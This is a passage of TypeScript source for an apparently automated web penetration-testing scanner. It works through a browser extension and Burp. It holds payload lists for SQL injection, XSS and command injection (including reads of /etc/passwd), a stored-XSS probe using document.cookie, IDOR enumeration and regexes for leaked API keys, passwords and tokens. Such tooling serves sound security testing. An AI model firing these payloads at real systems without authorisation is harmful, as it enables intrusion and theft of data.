      if (authDecisionResolve === resolve) {
        authDecisionResolve = null;
        console.error("[AuthDecision] No response in 30s — defaulting to 'skip'");
        resolve("skip");
      }
    }, 30000);
  });
}

// Pre-auth checkpoint: show HUD prompt asking pentester whether to attempt login.
// Returns true if user approves, false to skip auth entirely.
async function waitForLoginFormDecision(formUrl: string): Promise<boolean> {
  scanState.currentTest = `[AUTH] Login form detected at ${formUrl} — attempt auth?`;
  logActivity(`Login form found — waiting for pentester decision (30s timeout = skip)`, "Detected login form, asking pentester whether to attempt credentials");
  await sendExtensionCommand("hud-auth-choice", {
    postAuthUrl: formUrl,
    message: `Login form detected at ${formUrl}. Attempt authentication with test credentials?`,
    options: [
      { label: "✅ Yes, try auth", value: "run" },
      { label: "⏭️ Skip auth", value: "skip" },
    ]
  }, 3000).catch(() => {});

  return new Promise<boolean>((resolve) => {
    authDecisionResolve = (decision) => resolve(decision === "run");
    setTimeout(() => {
      if (authDecisionResolve) {
        authDecisionResolve = null;
        console.error("[LoginFormDecision] No response in 30s — defaulting to skip");
        logActivity("No response to auth checkpoint — skipping auth");
        resolve(false);
      }
    }, 30000);
  });
}

// After each confirmed finding, create a Burp Repeater tab
async function sendFindingToBurp(
  severity: string,
  label: string,
  method: string,
  url: string,
  headers: Record<string, string> = {},
  body?: string
): Promise<void> {
  // Only annotate Medium+ findings to avoid Repeater clutter
  if (!["Critical", "High", "Medium"].includes(severity)) return;
  try {
    // Short tab name: include path + truncated query so names like "Stored - /challenge"
    // become "Stored XSS - GET /challenge/panel?id=1" (≤80 chars total)
    const shortPathWithQuery = (() => {
      try {
        const u = new URL(url);
        const full = u.pathname + (u.search || "");
        return full.length > 36 ? full.slice(0, 35) + "…" : (full || "/");
      } catch { return url.slice(0, 36); }
    })();
    // Use full label — do NOT slice mid-word (was cutting "XSS" from "Potential XSS")
    const tabLabel = `${label} - ${method.toUpperCase()} ${shortPathWithQuery}`.slice(0, 80);
    const { host, port, useHttps, request } = buildRawRequest(method, url, headers, body);
    const toolName = burpMCPToolNames.find(n => n.toLowerCase().includes("repeater"))
      ?? "create_repeater_tab";
    // callBurpMCP will base64-encode `request` automatically
    await callBurpMCP(toolName, { host, port, useHttps, request, name: tabLabel, tabName: tabLabel });
    console.error(`[BurpMCP] Created Repeater tab: ${tabLabel}`);
  } catch (err: any) {
    // Non-fatal — scan continues even if Burp MCP is unreachable
    console.error(`[BurpMCP] Could not create Repeater tab (${err?.message ?? err})`);
  }
}

const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "admin' OR '1'='1'--",
  "' UNION SELECT NULL--",
  "' AND 1=2 UNION SELECT NULL, NULL--",
  "1' ORDER BY 1--",
  "1' ORDER BY 2--",
  "1' ORDER BY 3--",
];

const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "javascript:alert(1)",
  "'><script>alert(String.fromCharCode(88,83,83))</script>",
];

const COMMAND_INJECTION_PAYLOADS = [
  "; ls",
  "| whoami",
  "`id`",
  "$(cat /etc/passwd)",
  "&& cat /etc/passwd",
];

const IDOR_PAYLOADS = [
  "1",
  "2",
  "999",
  "-1",
  "0",
  "admin",
  "user1",
];

interface AutoCrawlOptions {
  targetUrl?: string;
  maxDepth?: number;
  attacks?: string[];
  observeMs?: number;
  timeoutMs?: number;
  settleMs?: number;
  credentials?: Array<{ username: string; password: string }>;
  captchaMode?: "manual" | "skip";
}

// ── Context-aware field classifier ──────────────────────────────────────────
// Analyses a CSS selector string (which contains field name/id/type) and
// returns an ordered list of attack types most likely to succeed on that field.
// This means the scan behaves like a human pentester who reads the field label
// before deciding what to inject, rather than blasting every payload at every field.
type FieldAttackType = "xss" | "sqli" | "ssti" | "cmdi" | "openredirect" | "pathtraversal" | "authinject";

function classifyField(selector: string): FieldAttackType[] {
  const s = selector.toLowerCase();
  // Extract the field name/id from the selector (e.g. input[name="search"] → "search")
  const nameMatch = s.match(/\[(?:name|id)=["']?([^"'\]\s]+)/);
  const fieldName = nameMatch ? nameMatch[1] : s;

  if (/cmd|command|exec|shell|ping|host|ip\b|addr|nslookup|dig|system/.test(fieldName))
    return ["cmdi", "sqli", "xss"];

  if (/template|theme|view|render|format|layout|lang|locale|tpl|engine/.test(fieldName))
    return ["ssti", "xss", "sqli"];

  if (/redirect|url\b|next|return_to|continue|goto|target|dest|redir|back|link|href/.test(fieldName))
    return ["openredirect", "sqli", "xss"];

  if (/file|path|dir|folder|include|load|read|attach|import|src\b|source/.test(fieldName))
    return ["pathtraversal", "sqli"];

  if (/search|query|q\b|find|keyword|term|filter|where|lookup|s\b/.test(fieldName))
    return ["sqli", "xss", "ssti"];

  if (/user|login|username|email|pass|password|auth|account|uname/.test(fieldName))
    return ["authinject", "sqli", "xss"];

  // Generic field — baseline XSS + SQLi
  return ["xss", "sqli"];
}

// ── Server-side technology detection ────────────────────────────────────────
// Makes a HEAD (falls back to GET) request through Burp and analyses response
// headers + body for server-side tech signals invisible to the browser DOM.
interface ServerTechFinding {
  slug: string;
  name: string;
  confidence: number;
  evidence: string;
}

async function detectServerTech(url: string): Promise<ServerTechFinding[]> {
  const findings: ServerTechFinding[] = [];

  // Queue browser nav for visibility while headers are probed server-side
  liveShow(url);
  let resp: { status: number; headers: Record<string, string>; body: string };
  try {
    resp = await sendRequestThroughBurp("HEAD", url);
    // Some servers don't support HEAD — fall back to GET (also populates the response cache)
    if (resp.status === 405 || resp.status === 501) {
      resp = await sendRequestFallbackCached("GET", url);
    }
  } catch (e) {
    // HEAD failed entirely — fall back to cached GET
    try {
      resp = await sendRequestFallbackCached("GET", url);
    } catch {
      console.error("[ServerTech] Request failed:", (e as any).message);
      return [];
    }
  }

  const h = (name: string) => (resp.headers[name.toLowerCase()] || "").toLowerCase();
  const body = resp.body || "";

  const add = (slug: string, name: string, confidence: number, evidence: string) => {
    const existing = findings.find((f) => f.slug === slug);
    if (!existing) {
      findings.push({ slug, name, confidence, evidence });
    } else if (confidence > existing.confidence) {
      existing.confidence = confidence;
      existing.evidence = evidence;
    }
  };

  // ── Runtime / framework headers ──────────────────────────────────────────
  const poweredBy = h("x-powered-by");
  if (/express/i.test(poweredBy))
    add("nodejs-express", "Node.js (Express)", 0.97, `X-Powered-By: ${resp.headers["x-powered-by"]}`);
  if (/next\.js/i.test(poweredBy))
    add("nextjs-server", "Next.js (server)", 0.97, `X-Powered-By: ${resp.headers["x-powered-by"]}`);
  if (/php\//i.test(poweredBy))
    add("php", "PHP", 0.99, `X-Powered-By: ${resp.headers["x-powered-by"]}`);
  if (/asp\.net/i.test(poweredBy))
    add("aspnet", "ASP.NET", 0.98, `X-Powered-By: ${resp.headers["x-powered-by"]}`);

  // ── Server header ─────────────────────────────────────────────────────────
  const serverHeader = h("server");
  if (/nginx/i.test(serverHeader))
    add("nginx", "nginx", 0.95, `Server: ${resp.headers["server"]}`);
  if (/apache/i.test(serverHeader))
    add("apache", "Apache", 0.95, `Server: ${resp.headers["server"]}`);
  if (/microsoft-iis/i.test(serverHeader))
    add("iis", "Microsoft IIS", 0.97, `Server: ${resp.headers["server"]}`);
  if (/cloudflare/i.test(serverHeader))
    add("cloudflare", "Cloudflare", 0.95, `Server: ${resp.headers["server"]}`);
  if (/openresty/i.test(serverHeader))
    add("openresty", "OpenResty (nginx+Lua)", 0.95, `Server: ${resp.headers["server"]}`);
  if (/kestrel/i.test(serverHeader))
    add("aspnet-core", "ASP.NET Core (Kestrel)", 0.97, `Server: ${resp.headers["server"]}`);
  if (/gunicorn/i.test(serverHeader))
    add("python-gunicorn", "Python (Gunicorn)", 0.96, `Server: ${resp.headers["server"]}`);
  if (/uvicorn/i.test(serverHeader))
    add("python-uvicorn", "Python (Uvicorn / FastAPI)", 0.96, `Server: ${resp.headers["server"]}`);
  if (/jetty/i.test(serverHeader))
    add("java-jetty", "Java (Jetty)", 0.95, `Server: ${resp.headers["server"]}`);
  if (/tomcat/i.test(serverHeader))
    add("java-tomcat", "Java (Tomcat)", 0.97, `Server: ${resp.headers["server"]}`);

  // ── ASP.NET / .NET headers ────────────────────────────────────────────────
  if (resp.headers["x-aspnet-version"])
    add("aspnet", "ASP.NET", 0.99, `X-AspNet-Version: ${resp.headers["x-aspnet-version"]}`);
  if (resp.headers["x-aspnetmvc-version"])
    add("aspnet-mvc", "ASP.NET MVC", 0.99, `X-AspNetMvc-Version: ${resp.headers["x-aspnetmvc-version"]}`);

  // ── Session cookies ───────────────────────────────────────────────────────
  const setCookie = h("set-cookie");
  if (/phpsessid/i.test(setCookie))
    add("php", "PHP", 0.92, "Set-Cookie: PHPSESSID detected");
  if (/jsessionid/i.test(setCookie))
    add("java-servlet", "Java (Servlet/JSP)", 0.93, "Set-Cookie: JSESSIONID detected");
  if (/asp\.net_sessionid/i.test(setCookie))
    add("aspnet", "ASP.NET", 0.95, "Set-Cookie: ASP.NET_SessionId detected");
  if (/laravel_session/i.test(setCookie))
    add("php-laravel", "PHP (Laravel)", 0.96, "Set-Cookie: laravel_session detected");
  if (/rack\.session/i.test(setCookie))
    add("ruby-rack", "Ruby (Rack/Rails)", 0.93, "Set-Cookie: rack.session detected");
  if (/connect\.sid/i.test(setCookie))
    add("nodejs-express", "Node.js (Express)", 0.95, "Set-Cookie: connect.sid (express-session) detected");

  // ── CDN / hosting headers ─────────────────────────────────────────────────
  if (resp.headers["cf-ray"])
    add("cloudflare", "Cloudflare", 0.99, "CF-Ray header present");
  if (resp.headers["x-vercel-id"])
    add("vercel", "Vercel", 0.99, "X-Vercel-Id header present");
  if (resp.headers["x-amzn-requestid"] || resp.headers["x-amz-cf-id"])
    add("aws", "AWS (CloudFront / Lambda)", 0.97, "AWS request-id header present");
  if (resp.headers["x-render-origin-server"])
    add("render", "Render.com", 0.97, "X-Render-Origin-Server header present");
  if (resp.headers["fly-request-id"])
    add("fly-io", "Fly.io", 0.97, "Fly-Request-Id header present");

  // ── TypeScript: source map references in the response body ───────────────
  // Bundlers emit `sourceMappingURL=*.ts.map` or source maps referencing .ts files
  if (/sourceMappingURL=[^\s]+\.ts\.map/i.test(body) || /["'][^"']+\.ts["']/.test(body))
    add("typescript", "TypeScript", 0.85, "Source map or .ts file reference found in response body");

  // ── Node.js: misc body signals ────────────────────────────────────────────
  if (/at\s+\w+\s+\(.*\.js:\d+:\d+\)/i.test(body))
    add("nodejs", "Node.js", 0.80, "Node.js stack trace pattern detected in response body");

  return findings.sort((a, b) => b.confidence - a.confidence);
}

// ══════════════════════════════════════════════════════════════════════
// Passive security checks — run against the base URL through Burp
// These fire once per scan and never submit any forms.
// ══════════════════════════════════════════════════════════════════════

interface PassiveFinding {
  type: string;
  severity: "Info" | "Low" | "Medium" | "High" | "Critical";
  endpoint: string;
  param: string;
  payload: string;
  evidence: string;
  poc?: string;
}

/** Direct fetch (no proxy) — used as fallback when Burp is not running */
async function fetchDirect(
  method: string,
  url: string,
  extraHeaders: Record<string, string> = {}
): Promise<{ status: number; headers: Record<string, string>; body: string }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
  try {
    const res = await fetch(url, {
      method,
      headers: { "User-Agent": "GhostCrawler/0.1.0", ...extraHeaders },
      redirect: "manual",
      signal: controller.signal,
    } as any);
    const body = await res.text().catch(() => "");
    return {
      status: res.status,
      headers: Object.fromEntries((res.headers as any).entries()),
      body,
    };
  } finally {
    clearTimeout(timer);
  }
}

/** Attempt request through Burp; fall back to direct if Burp unreachable */
async function sendRequestFallback(
  method: string,
  url: string,
  extraHeaders: Record<string, string> = {}
): Promise<{ status: number; headers: Record<string, string>; body: string; viaProxy: boolean }> {
  try {
    const r = await sendRequestThroughBurp(method, url, extraHeaders);
    return { ...r, viaProxy: true };
  } catch {
    const r = await fetchDirect(method, url, extraHeaders);
    return { ...r, viaProxy: false };
  }
}

// Cached wrapper: GET requests with no extra headers share a single response
// per URL per scan. Eliminates duplicate HTTP round-trips when multiple passive
// checks (headers, CORS, cookies, versions) all probe the same target URL.
async function sendRequestFallbackCached(
  method: string,
  url: string,
  extraHeaders?: Record<string, string>
): Promise<{ status: number; headers: Record<string, string>; body: string; viaProxy: boolean }> {
  const upperMethod = String(method).toUpperCase();
  if (upperMethod === "GET" && !extraHeaders) {
    const cached = _scanRespCache.get(url);
    if (cached) return cached;
    const result = await sendRequestFallback(upperMethod, url);
    _scanRespCache.set(url, result);
    return result;
  }
  return sendRequestFallback(upperMethod, url, extraHeaders ?? {});
}

// ── Authenticated scan phase ─────────────────────────────────────────────────
// Called automatically after any confirmed auth bypass.  The browser is already
// sitting on the post-auth landing page.  This function:
//   1. Crawls all reachable post-auth pages live
//   2. For each page, runs IDOR enumeration, Stored XSS, SQLi, info-disclosure
//   3. Pushes every finding to HUD + Burp + scanState.vulnerabilities
async function runAuthenticatedScan(
  postAuthUrl: string,
  baseUrl: string
): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  const authVisited = new Set<string>();
  const settleMs = 1500;
  const timeoutMs = 12000;

  console.error(`[AuthScan] Starting authenticated scan from ${postAuthUrl}`);
  scanState.currentTest = `[AUTH] Starting authenticated scan from ${postAuthUrl}`;

  // ── Helper: get current page text ───────────────────────────────────
  const getBodyText = async (): Promise<string> => {
    try {
      const r = await sendExtensionCommand("browser_action", { action: "extract_text", selector: "body" }, 8000);
      return String(r?.text || r?.result?.text || "");
    } catch { return ""; }
  };

  // ── Helper: get current URL from browser ────────────────────────────
  const getCurrentUrl = async (): Promise<string> => {
    try {
      const r = await sendExtensionCommand("get_url", {}, 5000);
      return String(r?.url || r?.result?.url || "");
    } catch { return ""; }
  };

  // ── Helper: scan a page (get links, forms, endpoints) ───────────────
  const scanPage = async (): Promise<any> => {
    try {
      const r = await sendExtensionCommand("scan", {}, 20000);
      const maybe = r?.result || r;
      if (maybe?.scan?.page) return maybe.scan;
      return maybe;
    } catch { return null; }
  };

  // ── Helper: navigate live ────────────────────────────────────────────
  const navLive = async (url: string): Promise<void> => {
    scanState.currentTest = `[AUTH LIVE] → ${url}`;
    await sendExtensionCommand("browser_action", { action: "navigate", url }, timeoutMs);
    await new Promise(r => setTimeout(r, settleMs));
  };

  // ── Helper: raw HTML source for XSS reflection detection ─────────────
  const getPageSource = async (): Promise<string> => {
    try {
      const r = await sendExtensionCommand("browser_action", { action: "get_page_source" }, 8000);
      return String(r?.source || r?.result?.source || r?.html || r?.result?.html || "");
    } catch { return ""; }
  };

  // ── Helper: check if browser is on the login/base page ───────────────
  const isOnLoginPage = async (): Promise<boolean> => {
    const cur = await getCurrentUrl();
    if (!cur) return false;
    try {
      const curPath = new URL(cur).pathname;
      const basePath = new URL(baseUrl).pathname;
      // On login page when path matches baseUrl path (no sub-path) and no authenticated indicator
      return curPath === basePath || cur === baseUrl || cur.startsWith(baseUrl.replace(/\/$/, "") + "?");
    } catch { return false; }
  };

  // ── Helper: push finding ─────────────────────────────────────────────
  const pushFinding = (f: PassiveFinding) => {
    findings.push(f);
    pushVuln(f);
    sendExtensionCommand("hud-push", { findings: [f] }, 3000).catch(() => null);
    console.error(`[AuthScan] ✅ ${f.severity.toUpperCase()} — ${f.type} @ ${f.endpoint}`);
  };

  // ── Step 0: source-code review of the post-auth page ─────────────────
  // Re-run source review so panel-specific JS, hidden fields, and API
  // endpoints are discovered before crawling & active testing.
  if (!scanAbortFlag) {
    console.error(`[AuthScan] Source review of post-auth page: ${postAuthUrl}`);
    scanState.currentTest = `[AUTH] Source review: ${postAuthUrl}`;
    try {
      const postAuthSourceFindings = await checkClientSideSource(postAuthUrl);
      for (const f of postAuthSourceFindings) {
        findings.push(f);
        pushVuln(f);
        sendExtensionCommand("hud-push", { findings: [f] }, 3000).catch(() => null);
      }
      for (const f of postAuthSourceFindings) {
        if (f.type === "JS API Endpoint" && f.endpoint) {
          // Note: discoveredEndpoints is scoped to executeAutoCrawl; log for visibility only
          console.error(`[AuthScan] JS endpoint found in post-auth source: ${f.endpoint}`);
        }
      }
    } catch (e) {
      console.error(`[AuthScan] Post-auth source review error:`, String(e).slice(0, 120));
    }
  }

  // ── Step 1: collect all post-auth pages via link crawl ───────────────
  const pagesToVisit: string[] = [postAuthUrl];
  authVisited.add(postAuthUrl);

  // Always navigate to postAuthUrl first so user sees the authenticated area
  await navLive(postAuthUrl);

  for (let i = 0; i < pagesToVisit.length && i < 30 && !scanAbortFlag; i++) {
    const pageUrl = pagesToVisit[i];
    try {
      if (i > 0) await navLive(pageUrl);

      // Scan the page to extract links, forms, endpoints
      const surface = await scanPage();
      const currentUrl = await getCurrentUrl() || pageUrl;

      // Queue same-origin unvisited links
      try {
        const linkResult = await sendExtensionCommand("browser_action", {
          action: "extract_links",
          baseUrl,
        }, 8000);
        const links: string[] = (linkResult?.links || linkResult?.result?.links || []).filter((href: string) => {
          try {
            const u = new URL(href);
            const b = new URL(baseUrl);
            // Skip login/logout/redirect-back-to-login links so browser stays in auth area
            const isLoginPage = u.pathname === b.pathname && u.search === "";
            const isGateToLogin = /gate.*to=.*\/challenge\/?$|logout|signout/i.test(href);
            return u.origin === b.origin && !authVisited.has(href) && !isLoginPage && !isGateToLogin;
          } catch { return false; }
        });
        for (const lnk of links.slice(0, 15)) {
          if (!authVisited.has(lnk)) {
            authVisited.add(lnk);
            pagesToVisit.push(lnk);
          }
        }
      } catch { /* non-critical */ }

      // ── IDOR test ─────────────────────────────────────────────────────
      // Look for numeric ID params in the current URL (e.g. ?id=1, /panel?id=2)
      if (!scanAbortFlag) {
        try {
          const urlObj = new URL(currentUrl);
          const idParams = [...urlObj.searchParams.entries()].filter(([k]) =>
            /^(id|user_id|uid|userId|account_id|item_id|record_id|post_id)$/i.test(k)
          );
          for (const [paramName, originalId] of idParams) {
            const origNum = parseInt(originalId, 10);
            if (isNaN(origNum)) continue;
            const testIds = [1,2,3,4,5,10].filter(n => n !== origNum).slice(0, 5);
            const baseWithoutId = currentUrl.split("?")[0];
            const baseText = await getBodyText();

            for (const testId of testIds) {
              if (scanAbortFlag) break;
              const probeUrl = `${baseWithoutId}?${paramName}=${testId}`;
              scanState.currentTest = `[AUTH LIVE] IDOR probe: ${paramName}=${testId}`;
              liveShow(probeUrl);

              try {
                const resp = await sendRequestThroughBurp("GET", probeUrl, {}, undefined);
                if (resp.status === 200 && resp.body.length > 50) {
                  const probeText = resp.body.slice(0, 800);
                  const baseSlice = baseText.slice(0, 800);
                  // Different content = different user's data
                  if (probeText !== baseSlice && !/<(form|input)/i.test(probeText.slice(0, 200))) {
                    pushFinding({
                      type: "IDOR — Unauthorized Object Access",
                      severity: "High",
                      endpoint: `GET ${baseWithoutId}`,
                      param: paramName,
                      payload: `${paramName}=${testId} (own: ${paramName}=${originalId})`,
                      evidence: `GET ${probeUrl} returned HTTP 200 with content differing from own-resource response. No ownership check on ${paramName}. Body snippet: "${probeText.replace(/\s+/g, " ").slice(0, 200)}"`,
                    });
                    await sendFindingToBurp("High", `IDOR — ${paramName} enumeration`, "GET", probeUrl, {}, "");
                    break; // one confirmed IDOR per param is enough
                  }
                }
              } catch { /* non-critical */ }
            }
          }
        } catch { /* URL parse error */ }
      }

      // ── Form attacks on this authenticated page ────────────────────────
      if (!scanAbortFlag && surface?.forms?.length) {
        const forms: any[] = surface.forms;
        for (const form of forms.slice(0, 3)) {
          if (scanAbortFlag) break;
          const fields: any[] = form.fields || [];
          const textFields = fields.filter((f: any) => {
            const t = String(f?.type || "text").toLowerCase();
            return !["submit", "hidden", "button", "file", "checkbox", "radio"].includes(t);
          });
          if (!textFields.length) continue;

          // Test ALL text fields (not just the first) so textarea/notes fields are covered
          for (const targetField of textFields) {
            if (scanAbortFlag) break;
            const targetSelector = targetField?.selector || (targetField?.name ? `[name="${targetField.name}"]` : null);
            if (!targetSelector) continue;
            const submitSel = (surface.buttons || []).find((b: any) => /submit/i.test(String(b?.text || b?.selector || "")))?.selector || "button[type='submit']";

            // ── Stored XSS ──────────────────────────────────────────────────
            const xssPayload = `<img src=x onerror=alert(document.cookie)>`;
            scanState.currentTest = `[AUTH LIVE] Stored XSS on ${currentUrl} field:${targetField?.name || targetSelector}`;
            try {
              await navLive(currentUrl);
              // Guard: if we ended up on login, session is gone — skip attacks for this page
              if (await isOnLoginPage()) {
                console.error(`[AuthScan] Session lost navigating to ${currentUrl} — landed on login, skipping form attacks`);
                break;
              }
              await sendExtensionCommand("browser_action", {
                action: "smart_fill_form",
                targetSelector,
                payload: xssPayload,
              }, 8000);
              try {
                await sendExtensionCommand("browser_action", { action: "click", selector: submitSel }, 8000);
              } catch {
                // No standard submit button — try JS save functions (e.g. window.saveNote())
                // then fall back to button text-match, then Enter key.
                const jsSaved = await sendExtensionCommand("browser_action", {
                  action: "execute_script",
                  script: `
                    var fns = ['saveNote','save','submitNote','handleSave','onSave'];
                    for (var i = 0; i < fns.length; i++) {
                      if (typeof window[fns[i]] === 'function') { window[fns[i]](); return fns[i]; }
                    }
                    var btns = document.querySelectorAll('button, [role="button"], input[type="submit"]');
                    for (var j = 0; j < btns.length; j++) {
                      var t = (btns[j].textContent||btns[j].value||'').trim().toLowerCase();
                      if (/save|submit|send|update|add|post/.test(t)) { btns[j].click(); return 'btn:'+t; }
                    }
                    return null;
                  `,
                }, 6000).catch(() => null);
                const savedVia = jsSaved?.result?.value ?? jsSaved?.result?.result?.value ?? null;
                console.error(`[AuthScan] XSS submit fallback: ${savedVia ?? 'Enter key'}`);
                if (!savedVia) {
                  await sendExtensionCommand("browser_action", { action: "type", selector: targetSelector, text: "\n" }, 5000).catch(() => null);
                }
              }
              // Extra wait for async save + loadNote() refetch when JS-driven (e.g. window.saveNote)
              await new Promise(r => setTimeout(r, 3000));

              // For stored XSS: navigate back to the same page and check raw HTML
              // (plain text extraction strips HTML tags making onerror invisible)
              await navLive(currentUrl);
              if (await isOnLoginPage()) {
                console.error(`[AuthScan] Session lost after XSS submit — landed on login, skipping`);
                break;
              }
              const htmlSource = await getPageSource();
              // Also fall back to body text if getPageSource not supported
              const bodyText = htmlSource || await getBodyText();
              const xssReflected = htmlSource
                ? (htmlSource.includes("onerror") || htmlSource.includes("src=x") || htmlSource.includes(xssPayload.slice(0, 10)))
                : (bodyText.includes("onerror") || bodyText.includes(xssPayload.slice(0, 20)));
              if (xssReflected) {
                const snippet = (htmlSource || bodyText).slice(0, 200).replace(/\s+/g, " ");
                pushFinding({
                  type: "Stored XSS",
                  severity: "Critical",
                  endpoint: `POST ${currentUrl}`,
                  param: targetField?.name || targetSelector,
                  payload: xssPayload,
                  evidence: `XSS payload reflected in page HTML after form submit + reload on ${currentUrl}. Field: ${targetField?.name || targetSelector}. Snippet: "${snippet}"`,
                });
                await sendFindingToBurp("Critical", "Stored XSS (authenticated)", "POST", currentUrl, {}, `${targetField?.name || "input"}=${encodeURIComponent(xssPayload)}`);
              }
            } catch (e: any) {
              console.error(`[AuthScan] XSS form test error on field ${targetField?.name}: ${e.message}`);
            }

            // ── SQLi on authenticated form ───────────────────────────────────
            const sqliPayload = "' OR '1'='1";
            scanState.currentTest = `[AUTH LIVE] SQLi on ${currentUrl} field:${targetField?.name || targetSelector}`;
            try {
              await navLive(currentUrl);
              if (await isOnLoginPage()) {
                console.error(`[AuthScan] Session lost navigating for SQLi — skipping`);
                break;
              }
              await sendExtensionCommand("browser_action", {
                action: "smart_fill_form",
                targetSelector,
                payload: sqliPayload,
              }, 8000);
              try {
                await sendExtensionCommand("browser_action", { action: "click", selector: submitSel }, 8000);
              } catch {
                const jsSaved = await sendExtensionCommand("browser_action", {
                  action: "execute_script",
                  script: `
                    var fns = ['saveNote','save','submitNote','handleSave','onSave'];
                    for (var i = 0; i < fns.length; i++) {
                      if (typeof window[fns[i]] === 'function') { window[fns[i]](); return fns[i]; }
                    }
                    var btns = document.querySelectorAll('button, [role="button"], input[type="submit"]');
                    for (var j = 0; j < btns.length; j++) {
                      var t = (btns[j].textContent||btns[j].value||'').trim().toLowerCase();
                      if (/save|submit|send|update|add|post/.test(t)) { btns[j].click(); return 'btn:'+t; }
                    }
                    return null;
                  `,
                }, 6000).catch(() => null);
                const savedVia2 = jsSaved?.result?.value ?? jsSaved?.result?.result?.value ?? null;
                console.error(`[AuthScan] SQLi submit fallback: ${savedVia2 ?? 'Enter key'}`);
                if (!savedVia2) {
                  await sendExtensionCommand("browser_action", { action: "type", selector: targetSelector, text: "\n" }, 5000).catch(() => null);
                }
              }
              await new Promise(r => setTimeout(r, settleMs));
              if (await isOnLoginPage()) {
                console.error(`[AuthScan] Redirected to login after SQLi submit — session lost, skipping`);
                break;
              }
              const errText = await getBodyText();
              const sqlKeywords = ["sql", "syntax error", "mysql", "sqlstate", "sqlite", "postgresql", "ora-", "db2"];
              if (sqlKeywords.some(kw => errText.toLowerCase().includes(kw))) {
                pushFinding({
                  type: "SQL Injection (Authenticated)",
                  severity: "Critical",
                  endpoint: `POST ${currentUrl}`,
                  param: targetField?.name || targetSelector,
                  payload: sqliPayload,
                  evidence: `SQL error in response after authenticated form injection on field ${targetField?.name || targetSelector}. Body snippet: "${errText.slice(0, 300).replace(/\s+/g, " ")}"`,
                });
                await sendFindingToBurp("Critical", "SQLi (authenticated)", "POST", currentUrl, {}, `${targetField?.name || "input"}=${encodeURIComponent(sqliPayload)}`);
              }
            } catch (e: any) {
              console.error(`[AuthScan] SQLi form test error on field ${targetField?.name}: ${e.message}`);
            }
          } // end for (const targetField of textFields)
        } // end for (const form of forms)
      } // end if forms

      // ── Fallback: test standalone textarea/input (JS-driven, no <form>) ─
      // Catches note fields, comment boxes, etc. that submit via fetch() not HTML form
      if (!scanAbortFlag) {
        try {
          const elemResult = await sendExtensionCommand("browser_action", {
            action: "query_elements",
            selector: "textarea, input[type='text'], input:not([type])",
          }, 8000);
          const standaloneElems: any[] = elemResult?.elements || elemResult?.result?.elements || [];
          // Filter out elements that belong to a detected form (already tested above)
          const formSelectors = new Set((surface?.forms || []).flatMap((f: any) =>
            (f.fields || []).map((field: any) => field?.selector || `[name="${field?.name}"]`)
          ));
          const untestedElems = standaloneElems.filter((el: any) => {
            const sel = el?.selector || el?.id && `#${el.id}` || el?.name && `[name="${el.name}"]`;
            return sel && !formSelectors.has(sel);
          });

          for (const el of untestedElems.slice(0, 5)) {
            if (scanAbortFlag) break;
            const elSel = el?.selector || (el?.id ? `#${el.id}` : el?.name ? `[name="${el.name}"]` : null);
            if (!elSel) continue;

            // ── Standalone Stored XSS ────────────────────────────────────
            const xssPayload = `<img src=x onerror=alert(document.cookie)>`;
            scanState.currentTest = `[AUTH LIVE] Stored XSS (standalone) on ${currentUrl} → ${elSel}`;
            try {
              await navLive(currentUrl);
              if (await isOnLoginPage()) { break; }
              await sendExtensionCommand("browser_action", { action: "clear", selector: elSel }, 3000).catch(() => null);
              await sendExtensionCommand("browser_action", { action: "type", selector: elSel, text: xssPayload }, 8000);
              // Strategy 1: execute any saveNote/save/submit function visible on the page
              const saved = await sendExtensionCommand("browser_action", {
                action: "execute_script",
                script: `
                  var fns = ['saveNote','save','submitNote','handleSave','onSave'];
                  for (var i = 0; i < fns.length; i++) {
                    if (typeof window[fns[i]] === 'function') { window[fns[i]](); return fns[i]; }
                  }
                  // fallback: click visible button with save/submit text
                  var btns = document.querySelectorAll('button, [role="button"], input[type="submit"]');
                  for (var j = 0; j < btns.length; j++) {
                    var t = (btns[j].textContent||btns[j].value||'').trim().toLowerCase();
                    if (/save|submit|send|update|add|post/.test(t)) { btns[j].click(); return 'btn:'+t; }
                  }
                  return null;
                `,
              }, 6000).catch(() => null);
              console.error(`[AuthScan] Standalone save result: ${JSON.stringify(saved?.result?.value ?? saved)}`);
              await new Promise(r => setTimeout(r, 3000)); // wait for async save + loadNote()
              // Navigate back and check raw HTML for reflection
              await navLive(currentUrl);
              if (await isOnLoginPage()) { break; }
              await new Promise(r => setTimeout(r, 2000)); // wait for loadNote() fetch to complete
              const html = await getPageSource();
              const reflected = html && (html.includes("onerror") || html.includes("src=x") || html.includes("<img src=x") || html.includes("alert(document.cookie)"));
              if (reflected) {
                pushFinding({
                  type: "Stored XSS (JS-driven form)",
                  severity: "Critical",
                  endpoint: `POST ${currentUrl}`,
                  param: el?.name || el?.id || elSel,
                  payload: xssPayload,
                  evidence: `XSS payload <img src=x onerror=...> reflected in raw HTML after save on ${currentUrl}. Field: ${elSel}`,
                });
                await sendFindingToBurp("Critical", "Stored XSS — JS form (authenticated)", "POST", currentUrl, {}, `${el?.name || "note"}=${encodeURIComponent(xssPayload)}`);
              }
            } catch (e: any) {
              console.error(`[AuthScan] Standalone XSS error on ${elSel}: ${e.message}`);
            }
          }
        } catch (e: any) {
          console.error(`[AuthScan] Standalone element query error: ${e.message}`);
        }
      } // end standalone fallback

      // ── Info disclosure on this authenticated page ─────────────────────
      if (!scanAbortFlag) {
        try {
          const pageBody = await getBodyText();
          const secretPatterns: Array<[RegExp, string]> = [
            [/(?:api[_-]?key|apikey|api_secret|access_key|secret_key)\s*[:=]\s*["']?([A-Za-z0-9\-_]{16,})/i, "API Key"],
            [/(?:password|passwd|pwd)\s*[:=]\s*["']([^"']{8,})/i, "Plaintext Password"],
            [/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/, "JWT Token"],
            [/(?:aws_access_key_id|AKIA)[=:\s]+([A-Z0-9]{20})/, "AWS Access Key"],
          ];
          for (const [pattern, label] of secretPatterns) {
            const match = pageBody.match(pattern);
            if (match) {
              pushFinding({
                type: `Info Disclosure — ${label} in Authenticated Page`,
                severity: "High",
                endpoint: `GET ${currentUrl}`,
                param: label.toLowerCase().replace(/\s/g, "_"),
                payload: "",
